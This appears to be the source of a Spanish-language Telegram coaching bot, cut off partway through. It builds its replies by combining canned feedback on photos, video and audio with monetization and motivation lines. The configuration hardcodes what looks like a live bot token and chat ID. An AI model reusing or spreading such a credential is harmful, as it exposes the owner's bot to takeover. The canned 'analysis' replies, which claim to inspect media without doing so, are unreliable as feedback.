uimport logging
import os
import random
import re
import sqlite3
from datetime import datetime, timedelta

from telegram import KeyboardButton, ReplyKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ======================
# CONFIGURACIÓN
# ======================
TELEGRAM_TOKEN = (
    os.getenv("TELEGRAM_BOT_TOKEN")
    or "9079896633:AAEo-NdxQQtZOUBYqn1X6Uhk2He4dnh9AGI"
)
DANI_CHAT_ID = int(os.getenv("DANI_CHAT_ID", "8099004064"))
RENDER_EXTERNAL_URL = os.getenv(
    "RENDER_EXTERNAL_URL", "https://luna-bot-a1fc.onrender.com"
)
DB_PATH = os.getenv("SQLITE_PATH", "nuevo_bot.db")


# ======================
# MOTOR DE RESPUESTAS
# ======================
PREFIJOS_HACKER_FICCION: list[str] = [""]

BASES_FOTO = [
    "Analizando encuadre y exposición: la luz frontal limpia levanta el detalle al instante 📸",
    "Buen contraste y presencia en esa toma ✨ Ajustar el ángulo de cámara y limpiar el fondo sube la calidad sin filtros pesados.",
    "Esa foto tiene gancho visual 🔥 Si cuidas la dirección de la luz y evitas sombras duras detrás, destaca mucho más.",
    "Se ve auténtica y segura 💅 Un encuadre un poco más cerrado o a la altura de los ojos suele dar más fuerza.",
    "Buena composición general 🌟 Con iluminación pareja y un punto focal claro, funciona genial para portada o adelanto.",
    "Estilo bien marcado 😘 Probar tres variaciones iguales cambiando solo pose o expresión te da material de sobra.",
    "En términos de metadata visual y estética, la limpieza del plano hace que el ojo vaya directo a ti 🎯",
    "La foto se siente cercana y natural. Si subes un poco el brillo en el rostro y bajas el ruido del fondo, gana presencia.",
    "Buen uso del espacio negativo. Acércate un poco más o gira el torso para que la silueta se lea más clara.",
    "La expresión es lo que más vende aquí. Mantén la mirada a cámara y relaja un poco la mandíbula.",
    "Iluminación correcta en general. Prueba luz lateral suave para marcar mejor el volumen del cuerpo.",
    "El fondo compite un poco con el sujeto. Un fondo más limpio o desenfocado haría que destaces más.",
    "Pose estable y segura. Abre un poco más los hombros y baja ligeramente el mentón para más intensidad.",
    "Buen color de piel. Evita luces muy frías encima de la cabeza porque aplastan los rasgos.",
    "La toma tiene potencial de portada. Recorta un poco por los lados y centra el punto de interés.",
    "Se nota intención en la foto. Cambia solo la dirección de la mirada y tendrás otra versión lista.",
    "La composición es sólida. Añade un elemento de textura cerca (tela, pared, sábana) para dar profundidad.",
    "Buena altura de cámara. Baja un poco el ángulo para alargar visualmente la figura.",
    "La foto transmite confianza. Prueba la misma pose con la luz viniendo desde la ventana.",
    "Encuadre limpio. Si eliminas objetos pequeños del fondo, el resultado se ve más profesional.",
    "La expresión funciona. Entreabre un poco más los labios y suaviza la mirada.",
    "Contraste adecuado. Sube ligeramente las sombras para no perder detalle en las zonas oscuras.",
    "Buen equilibrio visual. Coloca el sujeto un poco desplazado del centro (regla de tercios).",
    "La foto se siente real. Evita el flash directo; la luz rebotada queda mucho más favorecedora.",
    "Pose interesante. Gira un poco más la cadera y mantén el hombro delantero más bajo.",
    "Calidez de color correcta. Si el ambiente es frío, añade una luz cálida de relleno.",
    "Se ve cuidada. Prueba la misma toma con el pelo recogido y otra con el pelo suelto.",
    "Buen uso de la profundidad. Acerca un objeto al primer plano para dar más tridimensionalidad.",
    "La mirada sostiene la foto. No mires hacia abajo; mantén contacto visual con el lente.",
    "Composición equilibrada. Deja un poco más de aire por encima de la cabeza.",
    "La textura de la piel se ve bien. Evita filtros que borren demasiado el detalle natural.",
    "Ángulo favorecedor. Inclina ligeramente el teléfono para alargar la línea del cuello.",
    "Buena saturación. No fuerces los colores; lo natural vende más confianza.",
    "La pose tiene carácter. Prueba la misma pero con los brazos en otra posición.",
    "Fondo aceptable. Si puedes, aléjate un paso del fondo para separarte mejor.",
    "Luz general correcta. Usa un reflector improvisado (pared blanca o cartulina) para rellenar sombras.",
    "La foto tiene gancho. Cambia solo la expresión y tendrás contenido nuevo sin esfuerzo.",
    "Encuadre vertical bien aprovechado. Asegúrate de no cortar codos ni manos de forma rara.",
    "Se siente íntima y cercana. Mantén esa distancia; funciona muy bien para engagement.",
    "Buen control de la exposición. No dejes que las luces altas se quemen.",
    "La silueta se lee claro. Prueba contraluz suave para un look más artístico.",
    "Pose natural. Evita tensar los hombros; la relajación se nota en la foto.",
    "Colorimetría coherente. Si editas, mantén la piel con tonos reales.",
    "La toma está lista para publicar. Solo limpia un poco el ruido digital si lo hubiera.",
    "Buen ritmo visual. La mirada guía al espectador exactamente donde quieres.",
    "Composición limpia. Menos elementos = más impacto.",
    "La foto transmite seguridad. Esa es la base; ahora solo perfecciona la luz.",
    "Ángulo de cámara correcto. No dispares desde muy arriba ni muy abajo sin intención.",
    "Detalle bien capturado. Si hay joyas o texturas, asegúrate de que se lean.",
    "Se ve profesional. Con tres variaciones de esta misma idea ya tienes serie completa.",
]

BASES_VIDEO = [
    "Escaneando ritmo y cuadro a cuadro: los primeros dos segundos definen si deslizan o se quedan 🎬",
    "Buen movimiento en ese clip/GIF 🔥 Mantener plano estable y encuadre vertical limpio retiene mucho más.",
    "Tiene buen gancho ese movimiento ✨ Evita cortes bruscos al inicio y remata con una idea clara.",
    "Se siente natural y dinámico 🎥 Buena luz ambiental y ritmo constante ayudan a que no se pierda atención.",
    "Buena secuencia 💫 Un clip corto con inicio directo y cierre con llamada a la acción rinde muy bien.",
    "Buen timing visual ⚡ Probar bucles cortos o transiciones limpias le da un aire más profesional.",
    "El inicio atrapa. Mantén la energía de los primeros tres segundos en todo el clip.",
    "Movimiento fluido. Evita sacudidas de cámara; usa apoyo o estabilización simple.",
    "Buen ritmo de edición. No alargues tomas estáticas más de lo necesario.",
    "La iluminación se mantiene estable. Eso ayuda mucho a que el video se vea limpio.",
    "Encadre vertical correcto. Asegúrate de que el sujeto no quede pegado a los bordes.",
    "El final necesita más fuerza. Cierra con una mirada a cámara o un gesto claro.",
    "Buen uso del espacio. Deja que el movimiento respire sin llenar todo el cuadro.",
    "La duración es adecuada. Si se alarga, corta lo que no aporta.",
    "Transiciones limpias. Evita efectos pesados que distraigan del contenido.",
    "Se siente auténtico. Mantén esa naturalidad; la gente nota cuando está forzado.",
    "Buen control del foco. Si hay movimiento rápido, prioriza el rostro nítido.",
    "El audio ambiente no molesta. Si puedes, graba con menos ruido de fondo.",
    "La secuencia tiene arco. Principio-desarrollo-cierre se nota aunque sea corto.",
    "Plano estable. Un trípode improvisado cambia completamente la calidad percibida.",
    "Buen contraste visual. La ropa y el fondo se separan bien.",
    "El ritmo invita a seguir mirando. No rompas esa fluidez con cortes innecesarios.",
    "Encadre a la altura correcta. Evita ángulos extremos si no son parte del estilo.",
    "La energía se sostiene. Si baja a mitad, recorta esa parte.",
    "Buen uso de la luz natural. Filma cerca de la ventana en las horas doradas.",
    "El clip tiene personalidad. Refuerza eso con una expresión clara al final.",
    "Movimiento intencional. Cada gesto debe tener un motivo visual.",
    "La calidad de imagen se mantiene. Evita subir demasiado el ISO en oscuridad.",
    "Buen pacing. Alterna planos un poco más cerrados con planos medios.",
    "El cierre invita a interactuar. Una pregunta visual o gestual funciona muy bien.",
    "Secuencia coherente. No mezcles estilos de luz dentro del mismo clip corto.",
    "La atención se mantiene. Eso es lo más difícil; no lo pierdas con adornos.",
    "Buen control del espacio negativo. El vacío también comunica.",
    "El video se siente premium. Limpieza de imagen + ritmo = percepción de valor.",
    "Inicio directo. No hace falta introducción larga; entra al grano.",
    "La mirada a cámara en algún momento genera conexión fuerte.",
    "Buen equilibrio entre movimiento y pausa. Las pausas también venden.",
    "El formato vertical está bien aprovechado. Todo el contenido importante está centrado.",
    "Transición natural. Si hay corte, que no se sienta abrupto.",
    "La energía del principio se puede sostener hasta el final con un pequeño ajuste.",
    "Buen uso del cuerpo en el cuadro. La pose evoluciona de forma legible.",
    "El clip está listo para series. Haz dos variaciones cambiando solo la expresión.",
    "Luz consistente de principio a fin. Eso eleva mucho la percepción de calidad.",
    "El ritmo no aburre. Mantén esa densidad de información visual.",
    "Cierre claro. El espectador debe saber que el video terminó con intención.",
    "Buen trabajo de timing. Los gestos caen exactamente donde deben.",
    "La pieza funciona como adelanto o como contenido completo.",
    "Estabilidad + luz + ritmo = la tríada que más retiene.",
    "El movimiento cuenta una mini-historia aunque dure segundos.",
    "Se ve cuidado. Esa es la base de cualquier contenido que quiera monetizar.",
]

BASES_AUDIO = [
    "Analizando señal de voz: un tono cercano y pausas limpias generan confianza al instante 🎧",
    "Buena proyección vocal 🎙️ Hablar sin apuro y marcar las palabras clave hace que el mensaje pegue más.",
    "Suena muy natural esa nota de voz ✨ Grabar cerca del micrófono y con poco eco mejora la claridad de golpe.",
    "Tiene carácter cómo lo dices 🔥 La cadencia de la voz transmite seguridad sin necesidad de adornos.",
    "Buena vibra en el audio 💫 Terminar con una pregunta simple invita a responder rápido.",
    "Ritmo claro y directo 🔊 Un cierre firme y amable deja mejor recuerdo en quien escucha.",
    "El tono se siente cercano. Mantén esa calidez; genera mucha más conexión.",
    "Buena dicción. Se entiende todo sin esfuerzo; eso ya es ventaja.",
    "Las pausas están bien colocadas. Dan tiempo a que el mensaje se procese.",
    "La energía se sostiene durante todo el audio. No decae al final.",
    "Se nota seguridad en la voz. Eso transmite confianza al oyente.",
    "El volumen es adecuado. Ni muy bajo ni saturado.",
    "Buena presencia de micrófono. Se escucha limpio y sin demasiado ambiente.",
    "El ritmo no es apresurado. Hablar un poco más lento suele vender mejor.",
    "La inflexión es natural. Evita que suene leído o mecánico.",
    "Cierre claro. Deja la idea principal al final para que se recuerde.",
    "El audio tiene personalidad. Esa es la parte que no se puede copiar.",
    "Buena respiración. No se notan cortes de aire incómodos.",
    "El mensaje llega directo. Menos relleno y más contenido útil.",
    "La calidez de la voz invita a seguir escuchando.",
    "Se siente auténtico. La naturalidad genera más confianza que la perfección forzada.",
    "Buen control de la intensidad. Sube y baja de forma intencional.",
    "El final invita a responder. Una pregunta abierta funciona muy bien.",
    "La claridad es alta. Cualquier persona puede entenderlo a la primera.",
    "El tono es consistente. No hay saltos raros de energía.",
    "Buena duración. Ni demasiado corto ni arrastrado.",
    "Se escucha cuidado. Eso eleva la percepción de profesionalismo.",
    "La voz sostiene el interés. Mantén esa cadencia en futuros audios.",
    "El mensaje tiene estructura. Principio, desarrollo y cierre se notan.",
    "Buena presencia. La voz llena el espacio sin gritar.",
    "El audio genera cercanía. Esa es una de las mejores métricas cualitativas.",
    "Las palabras clave se marcan bien. El oyente sabe qué es importante.",
    "El ambiente no distrae. El foco está en lo que dices.",
    "Buena proyección sin forzar. La voz llega lejos sin esfuerzo.",
    "El ritmo acompaña el contenido. No va ni muy rápido ni muy lento.",
    "Se siente conversacional. Como si hablaras con una persona real.",
    "El cierre deja buen sabor de boca. Eso importa más de lo que parece.",
    "La intención se entiende claro. No hay ambigüedad en el mensaje.",
    "Buen equilibrio entre cercanía y autoridad.",
    "El audio está listo para usar como respuesta o como contenido.",
    "La textura de la voz es agradable. Eso retiene más tiempo de escucha.",
    "Se nota preparación sin que suene rígido.",
    "El mensaje es accionable. Quien escucha sabe qué hacer después.",
    "Buena higiene de audio. Sin ruidos molestos ni cortes raros.",
    "La voz transmite calma y seguridad al mismo tiempo.",
    "El tono invita a la interacción. Perfecto para generar respuestas.",
    "Se siente humano y cercano. Esa es la ventaja frente a textos fríos.",
    "El audio cumple su función con claridad y estilo.",
    "Buena base para futuros contenidos de voz.",
    "La presencia vocal es sólida. Sigue por ese camino.",
]

BASES_SALUDO = [
    "¡Hola, linda! 😘 ¿Qué estamos trabajando hoy: ideas, contenido, monetización o charla?",
    "¡Hola! 🌙 Qué bueno leerte por aquí. Cuéntame qué traes en mente hoy.",
    "¡Qué tal! ✨ Aquí ando lista. Mándame foto, video, audio o escribe lo que quieras.",
    "¡Hey! 🔥 Todo listo por aquí. ¿En qué te ayudo hoy?",
    "¡Hola, hermosa! 🖤 Qué gusto saludarte. ¿De qué te gustaría hablar hoy?",
    "¡Hola! Me alegra verte de nuevo. ¿Qué quieres revisar o mejorar hoy?",
    "¡Buenas! Aquí estoy. ¿Foto, estrategia, copy o solo charla?",
    "¡Hola! Dime qué tienes en la cabeza y lo bajamos a tierra.",
    "¡Hey! ¿Cómo va el día? Cuéntame en qué estás enfocada.",
    "¡Hola! Lista para ayudarte. ¿Qué necesitas ahora mismo?",
    "¡Qué gusto! ¿Seguimos con lo de ayer o empezamos algo nuevo?",
    "¡Hola! Mándame lo que quieras revisar y te doy feedback directo.",
    "¡Buenas! ¿En modo creación, venta o motivación hoy?",
    "¡Hola! Aquí sin prisa. Dime por dónde empezamos.",
    "¡Hey! ¿Qué tal la energía hoy? ¿En qué te apoyo?",
    "¡Hola! Cuéntame qué quieres lograr esta semana y lo partimos en pasos.",
    "¡Buenas! ¿Foto nueva, idea de contenido o duda de precios?",
    "¡Hola! Estoy aquí. ¿Qué es lo más urgente que tienes ahora?",
    "¡Hey! ¿Listas para pulir algo o para brainstormear?",
    "¡Hola! Dime qué sientes que necesita mejorar y lo atacamos.",
    "¡Buenas! ¿Quieres feedback rápido o una charla más larga?",
    "¡Hola! Aquí para lo que necesites. ¿Por dónde arrancamos?",
    "¡Hey! ¿Cómo te sientes con tu contenido últimamente?",
    "¡Hola! Mándame lo que tengas y lo revisamos juntas.",
    "¡Buenas! ¿Hoy es día de crear, de vender o de ordenar ideas?",
    "¡Hola! Cuéntame qué te gustaría que miráramos primero.",
    "¡Hey! ¿Tienes algo nuevo para revisar o empezamos de cero?",
    "¡Hola! Lista cuando tú lo estés. ¿Qué traes?",
    "¡Buenas! ¿En qué parte del proceso estás ahora mismo?",
    "¡Hola! Dime qué te está costando más y lo simplificamos.",
    "¡Hey! ¿Quieres ideas frescas o mejorar lo que ya tienes?",
    "¡Hola! Aquí para aterrizar lo que necesites.",
    "¡Buenas! ¿Cómo va el flujo de contenido esta semana?",
    "¡Hola! Cuéntame qué quieres lograr hoy conmigo.",
    "¡Hey! ¿Feedback de foto, de texto o de estrategia?",
    "¡Hola! Estoy disponible. ¿Qué miramos primero?",
    "¡Buenas! ¿Día productivo o día de reorganizar?",
    "¡Hola! Dime qué sientes que está trabado y lo destrabamos.",
    "¡Hey! ¿Listas para subir el nivel de algo concreto?",
    "¡Hola! Aquí sin juicio y con ideas claras. ¿Por dónde vamos?",
    "¡Buenas! ¿Qué es lo que más te gustaría mejorar ahora?",
    "¡Hola! Mándame contexto y te respondo con foco.",
    "¡Hey! ¿Charla ligera o trabajo concreto hoy?",
    "¡Hola! Cuéntame cómo te sientes con tu proyecto.",
    "¡Buenas! ¿Empezamos por lo fácil o por lo importante?",
    "¡Hola! Aquí para acompañarte y aterrizar ideas.",
    "¡Hey! ¿Qué quieres que miremos con lupa hoy?",
    "¡Hola! Dime el objetivo y armamos el camino.",
    "¡Buenas! ¿Cómo puedo serte más útil ahora mismo?",
    "¡Hola! Lista para lo que necesites. Tú marcas el ritmo.",
]

BASES_MONETIZACION = [
    "En estrategia digital la conversión sube cuando el embudo es simple y claro 💎",
    "Divide tu contenido en capas: acceso abierto para atraer, cercanía para fidelizar y exclusividad para monetizar 🔥",
    "Conectar de verdad consiste en entender qué valora tu audiencia y darle una oferta clara sin rodeos ✨",
    "Haz pruebas A/B con tus títulos y adelantos: pequeños cambios en el gancho mueven mucho los resultados 📊",
    "Menos fricción y más claridad: cuando quien mira sabe qué obtiene y cómo, decide más rápido 👑",
    "El precio se sostiene cuando el valor percibido es alto y la entrega es consistente.",
    "No compitas solo por precio. Compite por claridad, cercanía y resultados percibidos.",
    "Un embudo simple convierte más que uno complejo mal ejecutado.",
    "La confianza se construye antes de pedir el pago. El contenido gratuito bien hecho vende.",
    "Ofrece una entrada fácil y una subida de valor clara. Eso reduce la fricción.",
    "Los paquetes funcionan mejor cuando cada nivel tiene un beneficio obvio y distinto.",
    "La escasez real (no inventada) y la prueba social aumentan la decisión de compra.",
    "Habla del resultado que obtiene la persona, no solo de lo que tú entregas.",
    "Un llamado a la acción claro y repetido con naturalidad mejora la conversión.",
    "Mide qué tipo de contenido genera más mensajes y más compras. Doble esa línea.",
    "La consistencia semanal supera a las publicaciones esporádicas de alta calidad.",
    "Precios altos se sostienen con posicionamiento y con entrega impecable.",
    "Reduce los pasos entre el interés y el pago. Cada clic extra pierde gente.",
    "El storytelling de transformación vende más que la lista de características.",
    "Tus mejores clientas ya te compraron. Cuídalas y pídeles referidos.",
    "Un anticipo o una oferta limitada bien comunicada puede acelerar decisiones.",
    "La percepción de exclusividad aumenta el valor sin necesidad de bajar precio.",
    "Explica el “por qué ahora”. La urgencia real funciona mejor que la inventada.",
    "El contenido que educa y entretiene al mismo tiempo genera más confianza.",
    "Haz que el siguiente paso sea obvio: qué hacer, cómo y qué recibe.",
    "Los testimonios y resultados visibles reducen la duda de quien está indecisa.",
    "No regales todo. Deja claro qué hay detrás de la cortina de pago.",
    "La frecuencia de contacto importa. Desaparecer enfría la intención de compra.",
    "Empaqueta el valor. A veces el mismo contenido se vende mejor en formato pack.",
    "La claridad en las reglas y en lo que incluye evita fricciones posteriores.",
    "Prueba distintos ganchos de entrada. El mismo producto puede tener varias puertas.",
    "El posicionamiento premium se construye con coherencia visual y de mensaje.",
    "Quien entiende rápido el beneficio paga más fácil.",
    "La monetización estable viene de sistemas, no solo de picos de viralidad.",
    "Cuida la experiencia post-compra. Eso genera repetición y referidos.",
    "Habla con tu audiencia. Las objeciones reales te dicen qué mejorar.",
    "Un buen lead-in (adelanto) vende más que un post directo de venta.",
    "La confianza se acumula. Cada interacción suma o resta.",
    "Haz que pagar se sienta seguro y simple.",
    "El valor percibido sube cuando muestras proceso, no solo resultado final.",
    "Segmenta. No todo el mundo quiere lo mismo ni al mismo nivel.",
    "La narrativa de “antes y después” sigue siendo de las más efectivas.",
    "Mantén coherencia entre lo que prometes y lo que entregas.",
    "La paciencia estratégica supera a la desesperación por cerrar rápido.",
    "Cada contenido puede tener un objetivo: atraer, nutrir o convertir.",
    "El precio es una conversación sobre valor, no solo un número.",
    "Haz fácil el sí y difícil el arrepentimiento por no haber comprado.",
    "La monetización sostenible se basa en relaciones, no solo en transacciones.",
    "Revisa tus números. Lo que no se mide no se puede mejorar.",
    "La mejor oferta es la que la persona siente que fue hecha para ella.",
]

BASES_ANIMO = [
    "¡Arriba ese ánimo! 💪 A veces solo hace falta ajustar el enfoque y retomar con calma.",
    "No te compares con cuentas gigantes: cada proyecto tiene su propio ritmo y crecimiento real ✨",
    "¡Eso es actitud! 👑 Tu estilo propio es lo que no se puede copiar fácilmente.",
    "Respira, baja las revoluciones un rato y volvemos con calma 😉 ¿Qué quieres resolver primero?",
    "Los días bajos también forman parte del proceso. No significan que estés fallando.",
    "Has llegado más lejos de lo que crees. A veces solo falta mirar el camino recorrido.",
    "No tienes que ser productiva todos los días. Descansar también es estrategia.",
    "Tu valor no depende de una publicación ni de un número de likes.",
    "Está bien pedir ayuda y está bien ir más despacio cuando hace falta.",
    "El progreso real casi nunca se siente lineal. Confía en la constancia.",
    "Hoy puede ser un día de mantenimiento, no de récord. Eso también cuenta.",
    "No estás atrasada. Estás en tu propio tiempo.",
    "La comparación te roba energía que podrías usar en crear.",
    "Un paso pequeño hoy sigue siendo un paso.",
    "Tu voz y tu estilo importan aunque todavía no tengan el alcance que deseas.",
    "Está permitido cambiar de estrategia sin tirar todo lo anterior.",
    "Los resultados grandes se construyen con días ordinarios bien aprovechados.",
    "No tienes que motivarte a la fuerza. A veces solo hay que reducir la exigencia.",
    "Eres más resiliente de lo que tu ánimo de hoy te deja ver.",
    "El descanso no es lo contrario del progreso. Es parte de él.",
    "Puedes empezar otra vez desde donde estás, no desde cero.",
    "No todo se resuelve hoy. Prioriza una sola cosa y suéltala el resto.",
    "Tu proyecto no necesita ser perfecto para ser valioso.",
    "Las dudas no te descalifican. Te hacen humana.",
    "Está bien no tener todas las respuestas ahora mismo.",
    "La constancia vence al talento cuando el talento no se presenta.",
    "Hoy puedes hacer menos, pero con más presencia.",
    "No estás sola en esto aunque a veces se sienta así.",
    "El hecho de que te importe ya dice mucho de ti.",
    "Puedes cambiar el estándar y seguir avanzando.",
    "Un día difícil no borra el trabajo de semanas.",
    "Respira. Luego eliges el siguiente paso más pequeño posible.",
    "Tu ritmo es válido aunque no coincida con el de otras personas.",
    "No tienes que demostrar nada a nadie para merecer estar aquí.",
    "La energía vuelve. Cuida el cuerpo y la cabeza para recibirla.",
    "Está bien pausar sin abandonar.",
    "Lo que construyes con paciencia suele durar más.",
    "Hoy puedes solo sostener. Mañana ya veremos.",
    "Tu presencia importa más que tu productividad de un día.",
    "No tienes que resolverlo todo para dar un paso.",
    "La autocompasión también es una forma de disciplina.",
    "Puedes pedir tiempo y espacio sin sentirte culpable.",
    "El camino largo se camina con pasos sostenibles.",
    "Estás aprendiendo incluso en los días que se sienten estancados.",
    "No hace falta que sea espectacular. Hace falta que sea real.",
    "Tu historia todavía se está escribiendo.",
    "Un poco de gracia contigo misma cambia el día.",
    "Puedes volver cuando estés lista. El proyecto te espera.",
    "Hoy el objetivo puede ser simplemente no rendirte.",
    "Lo estás haciendo mejor de lo que tu cabeza te dice.",
]

BASES_GENERAL = [
    "Te sigo el hilo ✨ Vamos a bajarlo a pasos concretos para que sirva de verdad.",
    "Buen punto 🔥 ¿Cómo lo vas a aplicar en tu próximo movimiento o publicación?",
    "Me gusta cómo lo planteas 😉 Si me pasas foto, video o audio te doy una lectura directa.",
    "Totalmente 💅 La constancia gana siempre, incluso cuando los avances parecen pequeños.",
    "Claro que sí 🌙 Cuéntame un poco más del contexto para darte ideas más afiladas.",
    "Dato clave: en redes y proyectos digitales, la claridad y la constancia pesan más que el ruido ⚡",
    "Tiene sentido lo que dices. Si lo partimos en pasos, se vuelve más fácil de ejecutar.",
    "Me parece una buena dirección. ¿Qué es lo primero que podrías probar esta semana?",
    "Entiendo el punto. La clave está en volverlo acción concreta y medible.",
    "Sí. Y si le sumamos un poco de estructura, rinde mucho más.",
    "Buen enfoque. Ahora falta aterrizarlo en un formato que puedas repetir.",
    "Lo veo claro. ¿Quieres que armemos un mini-plan alrededor de eso?",
    "Interesante. Cuéntame un poco más para afinar la respuesta.",
    "De acuerdo. La diferencia la hace la ejecución, no solo la idea.",
    "Tiene potencial. Si lo pruebas en pequeño primero, reduces riesgo.",
    "Bien pensado. Ahora hay que mirar cómo lo percibe quien te sigue.",
    "Sí. Y conviene medirlo para no quedarnos solo en la intuición.",
    "Me suma lo que planteas. ¿Lo aplicamos a contenido, a ventas o a ambos?",
    "Claro. Vamos por partes para no saturarte.",
    "Buen diagnóstico. El siguiente paso es elegir una sola palanca y moverla.",
    "Lo entiendo. A veces menos opciones generan más movimiento.",
    "Sí. La simplicidad bien ejecutada suele ganar.",
    "Me gusta el criterio. Mantener el foco evita dispersarte.",
    "Correcto. La consistencia supera a la intensidad esporádica.",
    "Bien. Ahora transforma esa idea en una acción de los próximos tres días.",
    "Tiene lógica. Si quieres, lo convertimos en checklist.",
    "De acuerdo. El contexto cambia la recomendación, por eso pregunto.",
    "Sí. Y el tono con el que lo comuniques también influye.",
    "Buen punto de partida. Iterar es parte del proceso.",
    "Lo veo. La claridad hacia fuera empieza con claridad hacia dentro.",
    "Exacto. Menos fricción, más acción.",
    "Me parece útil. ¿Lo pruebas y me cuentas qué pasó?",
    "Sí. Y documentar lo que funciona te ahorra tiempo después.",
    "Bien orientado. Ahora elige un indicador simple para saber si avanza.",
    "Entendido. Vamos a hacerlo lo más concreto posible.",
    "Tiene fondo. La estrategia sin ejecución se queda en papel.",
    "De acuerdo. Prioriza lo que mueve la aguja de verdad.",
    "Sí. Y protege tu energía para lo que más impacta.",
    "Buen criterio. La calidad sostenida genera confianza.",
    "Lo sigo. Cuéntame el resultado que buscas y armamos el camino.",
    "Claro. A veces solo hay que cambiar el orden de los factores.",
    "Me encaja. La propuesta de valor tiene que notarse rápido.",
    "Sí. Y la coherencia entre lo que dices y lo que muestras.",
    "Bien. El siguiente nivel es sistematizar lo que ya te funciona.",
    "Entiendo. Vamos a simplificar hasta que sea ejecutable.",
    "Correcto. El feedback real de tu audiencia vale más que mil opiniones externas.",
    "De acuerdo. Prueba, mide, ajusta.",
    "Sí. Y no hace falta que sea perfecto para empezar.",
    "Buen enfoque. Mantén lo esencial y corta el ruido.",
    "Lo tenemos. Ahora lo bajamos a una acción clara.",
]

BLOQUES_TACTICOS = [
    "Tip práctico: prueba dos ganchos distintos y quédate con el que genere respuestas reales 📩",
    "Cierra siempre con una pregunta fácil para que la charla no se quede en el aire 😉",
    "Si preparas algo nuevo, deja pistas antes para generar expectativa real 🔥",
    "Cuida la presentación y el mensaje principal: lo simple convierte mejor ✨",
    "Graba cuando tengas mejor luz y energía para no forzar el resultado 🌿",
    "Regla de seguridad digital: nunca compartas datos sensibles ni contraseñas en chats abiertos 🛡️",
    "En OSINT (inteligencia de fuentes abiertas), todo lo que publicas deja rastro; cuida qué expones 🔍",
    "Evita caer en engaños tipo phishing o enlaces dudosos; verifica siempre el origen real ⚠️",
    "La higiene digital y el control de accesos son base real en ciberseguridad 🔐",
    "Prueba el mismo contenido en dos formatos distintos y compara resultados.",
    "Deja una sola llamada a la acción por pieza para no dispersar la atención.",
    "Usa ejemplos concretos en lugar de abstracciones; se entienden y se recuerdan más.",
    "Revisa tus tres últimos contenidos y detecta qué patrón se repite en los que mejor funcionaron.",
    "La primera frase decide si siguen leyendo. Cuídala más que el resto.",
    "Si algo no genera respuesta en varios intentos, cambia el ángulo, no solo el diseño.",
    "Documenta lo que funciona en una nota rápida. Tu yo del futuro te lo agradece.",
    "No publiques solo cuando esté perfecto. Publica cuando esté claro y honesto.",
    "El silencio también comunica. Si desapareces mucho tiempo, el reenganche cuesta más.",
    "Haz que el siguiente paso sea obvio para quien te lee o te mira.",
    "La coherencia visual y de tono genera reconocimiento sin que tengas que explicarlo.",
    "Pregunta a tu audiencia de vez en cuando. Las mejores ideas a veces vienen de ellas.",
    "Reduce opciones. Demasiadas decisiones matan la acción.",
    "Un buen cierre de contenido deja la puerta abierta a la conversación.",
    "La energía con la que creas se nota. Elige momentos en los que estés presente.",
    "Mide conversaciones y guardados, no solo likes. Dicen más de la intención.",
    "Si vas a vender, primero genera deseo y claridad. Después pide la acción.",
    "El contenido que educa y entretiene al mismo tiempo tiene más vida útil.",
    "Mantén una línea clara de lo que sí ofreces y lo que no.",
    "La repetición inteligente no aburre: ancla el mensaje.",
    "Cuida tu propio proceso. Sin sistema, todo depende del humor del día.",
    "Un cambio pequeño y medido enseña más que un reinicio total.",
    "La autenticidad bien comunicada genera más confianza que la pose perfecta.",
    "Si sientes fricción al crear, baja el nivel de exigencia y publica algo simple.",
    "El valor se percibe más cuando se muestra el proceso, no solo el resultado.",
    "No todo tiene que ser contenido nuevo. Reutiliza y reencuadra lo que ya funciona.",
    "La claridad vence al ingenio cuando la persona está en modo decisión.",
    "Protege tu atención. Lo que consumes influye en lo que creas.",
    "Un buen hábito de revisión semanal evita que se acumulen problemas.",
    "La paciencia estratégica es una ventaja competitiva real.",
    "Habla con quienes ya te compraron. Ahí está la información de más valor.",
    "El diseño sigue a la intención. Primero el mensaje, después la estética.",
    "Si el mensaje no se entiende en tres segundos, se puede mejorar.",
    "La consistencia construye autoridad más rápido que los picos aislados.",
    "Deja espacio para la respuesta. El contenido también es conversación.",
    "Tu archivo de contenidos antiguos es una mina si sabes reutilizarlo.",
    "La honestidad sobre límites genera más respeto del que crees.",
    "Un sistema simple que usas supera a un sistema complejo que abandonas.",
    "El feedback duele menos cuando lo pides con una pregunta concreta.",
    "La mejor optimización a veces es eliminar lo que no aporta.",
    "Sostén el hábito incluso en semanas flojas. Ahí se separa quien continúa.",
]

CIERRES_VARIADOS = [
    "¿Qué te parece si lo probamos hoy?",
    "Cuéntame cómo lo ves tú.",
    "¿Quieres que armemos una idea concreta sobre esto?",
    "Mándame una foto, audio o video si quieres que lo revisemos.",
    "¿Qué es lo que más te interesa trabajar ahora mismo?",
    "Seguimos, dime qué más traes en mente.",
    "¿Lo aplicamos hoy o ajustamos algo?",
    "¿Te late probarlo esta semana?",
    "Dime si quieres que bajemos esto a pasos.",
    "¿Qué parte te genera más duda?",
    "Si quieres, lo vemos con un ejemplo tuyo.",
    "¿Seguimos por aquí o cambias de tema?",
    "Cuéntame qué resultado te gustaría ver.",
    "¿Lo dejamos aquí o profundizamos un poco más?",
    "¿Quieres feedback más directo o más opciones?",
    "Mándame lo que tengas y lo miramos juntas.",
    "¿Qué es lo próximo que vas a intentar?",
    "Dime si esto te sirve o lo afinamos.",
    "¿Te ayudo a aterrizarlo en una acción concreta?",
    "¿Cómo se siente esto para ti?",
    "Si quieres, armamos una mini lista de próximos pasos.",
    "¿Quieres que te tire más ideas por este lado?",
    "Dime qué priorizamos ahora.",
    "¿Lo pruebas y me cuentas?",
    "¿Qué necesitas para dar el siguiente paso?",
    "Seguimos cuando quieras, aquí estoy.",
    "¿Te resuena o lo vemos desde otro ángulo?",
    "Cuéntame qué vas a hacer con esto.",
    "¿Quieres versión corta o más detallada?",
    "Dime y lo adaptamos a tu estilo.",
]


def construir_banco_masivo(bases: list[str]) -> list[str]:
    banco: list[str] = []
    prefijos = PREFIJOS_HACKER_FICCION or [""]
    for pref in prefijos:
        for base in bases:
            banco.append(f"{pref}{base}".strip())
            for bloque in BLOQUES_TACTICOS:
                banco.append(f"{pref}{base} {bloque}".strip())
                for cierre in CIERRES_VARIADOS:
                    banco.append(f"{pref}{base} {bloque} {cierre}".strip())
    return banco


BANCOS = {
    "foto": construir_banco_masivo(BASES_FOTO),
